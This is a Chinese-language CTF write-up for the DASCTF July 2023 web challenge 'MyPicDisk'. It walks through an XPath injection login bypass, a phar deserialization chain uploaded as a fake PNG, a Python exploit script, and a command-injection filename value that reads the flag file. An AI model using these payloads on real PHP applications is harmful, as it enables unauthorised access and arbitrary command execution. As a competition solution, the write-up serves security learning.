# DASCTF Jul.2023

## Web

### MyPicDisk

#### 0x00 获取源代码

先随意构造一个 Payload 如下

```
admin' 1=1#
```

可以得到回显如下（alert 弹窗）

```
登录成功!
you are not admin!!!!!
```

把 JavaScript 禁止后，查看源代码如下

```html
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>MyPicDisk</title>
</head>
<body>
<script>alert('you are not admin!!!!!');</script><script>location.href='/index.php';</script><!-- /y0u_cant_find_1t.zip -->
  <form action="index.php" method="post" enctype="multipart/form-data">
  选择图片：<input type="file" name="file" id="">
  <input type="submit" value="上传"></form>
  </body>
</html>
```

可以得到文件 `./y0u_cant_find_1t.zip` ，文件内 `index.php` 内容如下

```php
<?php
session_start();
error_reporting(0);
class FILE{
    public $filename;
    public $lasttime;
    public $size;
    public function __construct($filename){
        if (preg_match("/\//i", $filename)){
            throw new Error("hacker!");
        }
        $num = substr_count($filename, ".");
        if ($num != 1){
            throw new Error("hacker!");
        }
        if (!is_file($filename)){
            throw new Error("???");
        }
        $this->filename = $filename;
        $this->size = filesize($filename);
        $this->lasttime = filemtime($filename);
    }
    public function remove(){
        unlink($this->filename);
    }
    public function show()
    {
        echo "Filename: ". $this->filename. "  Last Modified Time: ".$this->lasttime. "  Filesize: ".$this->size."<br>";
    }
    public function __destruct(){
        system("ls -all ".$this->filename);
    }
}
?>

<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>MyPicDisk</title>
</head>
<body>
<?php
if (!isset($_SESSION['user'])){
  echo '
<form method="POST">
    username：<input type="text" name="username"></p>
    password：<input type="password" name="password"></p>
    <input type="submit" value="登录" name="submit"></p>
</form>
';
  $xml = simplexml_load_file('/tmp/secret.xml');
  if($_POST['submit']){
    $username=$_POST['username'];
    $password=md5($_POST['password']);
    $x_query="/accounts/user[username='{$username}' and password='{$password}']";
    $result = $xml->xpath($x_query);
    if(count($result)==0){
      echo '登录失败';
    }else{
      $_SESSION['user'] = $username;
        echo "<script>alert('登录成功!');location.href='/index.php';</script>";
    }
  }
}
else{
    if ($_SESSION['user'] !== 'admin') {
        echo "<script>alert('you are not admin!!!!!');</script>";
        unset($_SESSION['user']);
        echo "<script>location.href='/index.php';</script>";
    }
  echo "<!-- /y0u_cant_find_1t.zip -->";
  if (!$_GET['file']) {
    foreach (scandir(".") as $filename) {
      if (preg_match("/.(jpg|jpeg|gif|png|bmp)$/i", $filename)) {
        echo "<a href='index.php/?file=" . $filename . "'>" . $filename . "</a><br>";
      }
    }
    echo '
  <form action="index.php" method="post" enctype="multipart/form-data">
  选择图片：<input type="file" name="file" id="">
  <input type="submit" value="上传"></form>
  ';
    if ($_FILES['file']) {
      $filename = $_FILES['file']['name'];
      if (!preg_match("/.(jpg|jpeg|gif|png|bmp)$/i", $filename)) {
        die("hacker!");
      }
      if (move_uploaded_file($_FILES['file']['tmp_name'], $filename)) {
          echo "<script>alert('图片上传成功!');location.href='/index.php';</script>";
      } else {
        die('failed');
      }
    }
  }
  else{
      $filename = $_GET['file'];
      if ($_GET['todo'] === "md5"){
          echo md5_file($filename);
      }
      else {
          $file = new FILE($filename);
          if ($_GET['todo'] !== "remove" && $_GET['todo'] !== "show") {
              echo "<img src='../" . $filename . "'><br>";
              echo "<a href='../index.php/?file=" . $filename . "&&todo=remove'>remove</a><br>";
              echo "<a href='../index.php/?file=" . $filename . "&&todo=show'>show</a><br>";
          } else if ($_GET['todo'] === "remove") {
              $file->remove();
              echo "<script>alert('图片已删除!');location.href='/index.php';</script>";
          } else if ($_GET['todo'] === "show") {
              $file->show();
          }
      }
  }
}
?>
</body>
</html>
```

#### 0x01 代码逻辑

1. 判断 `$_SESSION['user']` 是否存在，不存在跳 2，存在跳转 3；
2. 进行登录操作，登录成功即将 `$_POST['username']` 的值赋给 `$_SESSION['user']` ，并跳转回 `./index.php` 即跳转 1。
3. 判断 `$_SESSION['user']` 是否为 `admin` ，不是则弹窗 `you are not admin!!!!!` 并跳转回 `./index.php` 即跳转 1。\*\*但因没有 `die()` 和 `exit()` 或者其它类似函数，因此函数还会继续往下执行，这也是这题的突破口。\*\*跳转4；
4. 判断 `$_GET['file']` 是否存在，存在则根据 `todo` 来执行操作，不存在跳转 5；
   * `todo=md5` 将执行 `md5_file()` 显示文件的 MD5 哈希值。
   * `todo=remove` 将执行 `FILE::remove()` 删除文件操作，并跳转 1。
   * `todo=show` 将执行 `FILE::show()` 显示图片信息。
   * 若不等于上述任何一种则返回图片以及两个功能键。
5. 进行图片上传操作，有白名单，需要上传图片马。

#### 0x02 解题逻辑

1. 通过表单提交登录，使得 `$_SESSION['user']` 存在；
2. 通过表单上传图片马，上传后由于 `unset($_SESSION['user']);` 因此执行下次操作前需再次登录；
3. 再次登录后通过 `todo=md5` 执行 `FILE::__destruct()` 来获得 flag。

#### 0x03 构造反序列化

```php
<?php
class FILE{
  public $filename;

  public function __destruct(){
    system("ls -all ".$this->filename);
  }
}

$a = new FILE();
$a->filename = '/';

$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($a);
$phar->addFromString('test.txt', 'test');
$phar->stopBuffering();
```

将 `test.phar` 上传至靶机

```python
import requests

url = 'http://28174d4c-86e7-4f17-b323-4861354044e3.node4.buuoj.cn:81/'
session = requests.Session()


def login():
    ret = session.post(url, data={
        "username": "admin' 1=1#",
        "password": "",
        "submit": "登录"
    })
    return '登录成功!' in ret.text


if login():
    ret = session.post(url, files={
        "file": ('test.png', open(r'test.phar', 'rb').read(), 'image/png')
    })


if login():
    ret = session.get(url, params={
        "file": "phar:///var/www/html/test.png",
        "todo": "md5"
    })
    print(ret.text)
```

可以得到回显如下

```bash
total 8
drwxr-xr-x    1 root root   89 Jul 30 03:29 .
drwxr-xr-x    1 root root   89 Jul 30 03:29 ..
-rwxr-xr-x    1 root root    0 Jul 30 03:29 .dockerenv
-rw-rw-r--    1 root root   45 Jul 30 03:29 adjaskdhnask_flag_is_here_dakjdnmsakjnfksd
drwxr-xr-x    1 root root   28 Oct 13  2020 bin
drwxr-xr-x    2 root root    6 Sep 19  2020 boot
drwxr-xr-x    5 root root  360 Jul 30 03:29 dev
drwxr-xr-x    1 root root   66 Jul 30 03:29 etc
drwxr-xr-x    2 root root    6 Sep 19  2020 home
drwxr-xr-x    1 root root   21 Oct 13  2020 lib
drwxr-xr-x    2 root root   34 Oct 12  2020 lib64
drwxr-xr-x    2 root root    6 Oct 12  2020 media
drwxr-xr-x    2 root root    6 Oct 12  2020 mnt
drwxr-xr-x    2 root root    6 Oct 12  2020 opt
dr-xr-xr-x 2072 root root    0 Jul 30 03:29 proc
drwx------    1 root root    6 Oct 13  2020 root
drwxr-xr-x    1 root root   21 Oct 13  2020 run
drwxr-xr-x    1 root root   20 Oct 13  2020 sbin
drwxr-xr-x    2 root root    6 Oct 12  2020 srv
dr-xr-xr-x   13 root root    0 Mar 28 03:11 sys
drwxrwxrwt    1 root root 4096 Jul 30 04:06 tmp
drwxr-xr-x    1 root root   19 Oct 12  2020 usr
drwxr-xr-x    1 root root   17 Oct 13  2020 var
```

将 PHP 代码中的 `$a->filename` 修改为

```php
$a->filename = '/; cat /adjaskdhnask_flag_is_here_dakjdnmsakjnfksd;';
```

再次上传靶机即可获得 flag 。
